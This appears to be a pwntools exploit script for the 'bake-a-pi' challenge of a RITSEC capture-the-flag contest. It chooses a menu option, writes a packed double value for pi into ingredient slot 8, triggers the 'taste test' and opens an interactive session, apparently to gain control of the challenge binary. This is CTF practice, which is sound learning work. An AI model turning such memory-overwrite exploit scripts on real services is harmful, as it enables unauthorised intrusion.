#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  1555
HOST = "bake-a-pi.ctf.ritsec.club"
exe = context.binary = ELF('./pi.bin', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

payload = struct.pack("<d", 3.141592653589793)

p.sendlineafter(b"(S)how recipe, (C)change ingredient, (T)aste test: ", b"C")
p.sendlineafter(b"Which ingredient would you like to change?: ", b"8")
p.sendafter(b"Enter ingredient: ", payload + b"\n")
p.sendlineafter(b"(S)how recipe, (C)change ingredient, (T)aste test: ", b"T")

p.interactive()
